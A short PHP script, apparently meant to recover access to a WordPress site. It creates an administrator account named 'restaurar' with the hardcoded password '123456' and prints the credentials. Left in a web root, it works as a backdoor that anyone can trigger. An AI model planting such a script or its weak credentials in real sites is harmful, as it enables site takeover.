<?php
require_once('wp-load.php');
$user = 'restaurar';
$pass = '123456';
$email = 'admin@lussogroup.es';
if ( !username_exists($user) ) {
    $user_id = wp_create_user($user, $pass, $email);
    $user = new WP_User($user_id);
    $user->set_role('administrator');
    echo "✅ Administrador creado: usuario <b>restaurar</b> / pass <b>123456</b>";
} else {
    echo "⚠️ Ya existe un usuario con ese nombre.";
}
?>
